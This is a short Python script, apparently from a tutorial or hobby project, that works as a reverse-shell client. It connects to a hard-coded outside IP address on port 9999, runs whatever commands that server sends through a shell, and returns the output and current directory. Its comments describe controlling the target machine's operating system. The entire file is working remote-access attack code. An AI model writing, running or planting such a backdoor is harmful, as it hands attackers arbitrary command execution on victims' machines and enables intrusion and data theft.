import socket
# control operating system of target machine
import os
import subprocess

s = socket.socket() # client computer can connect to others

# ip address of server, can use own computer's private IP if doing on local
host = "182.177.8.249"
port = 9999

s.connect((host, port)) # binds client computer to server computer

# infinite loop for continuous listening for server's commands
while True:
        data = s.recv(1000000)
        if data[:2].decode("utf-8") == 'cd': # command to change directory (cd)
                os.chdir(data[3:].decode("utf-8")) # look at target directory to cd to

        if len(data) > 0: # check if there are actually data/commands received (that is not cd)
                
                # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                
                # bytes and string versions of results
                output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
                output_str = str(output_bytes, "utf-8") # plain old basic string

                # getcwd allows the server side to see where the current working directory is on the client
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                # client can see what server side is doing

# close connection
s.close()






